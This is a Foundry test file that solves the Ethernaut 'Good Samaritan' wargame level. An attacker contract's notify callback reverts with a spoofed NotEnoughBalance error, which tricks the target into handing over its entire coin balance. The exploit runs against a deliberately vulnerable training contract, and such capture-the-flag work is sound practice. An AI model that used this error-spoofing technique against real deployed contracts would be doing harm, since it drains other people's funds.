// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {GoodSamaritanFactory} from "../src/levels/27-GoodSamaritanFactory.sol";
import {GoodSamaritan, Coin, Wallet, INotifyable} from "../src/levels/27-GoodSamaritan.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {Level} from  "../src/core/BaseLevel.sol";

contract Greed is INotifyable{
    error NotEnoughBalance();

    function attack(GoodSamaritan samaritan) external  {
        try samaritan.requestDonation() {} catch{
            return;
        }
    }

    function notify(uint256 amount) external{
        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);
    GoodSamaritanFactory internal factory;

    function solution(GoodSamaritan target) internal {
        Greed greed = new Greed();
        greed.attack(target);
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        factory = new GoodSamaritanFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(Level(address(factory)));
        GoodSamaritan goodSamaritanContract = GoodSamaritan(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(goodSamaritanContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
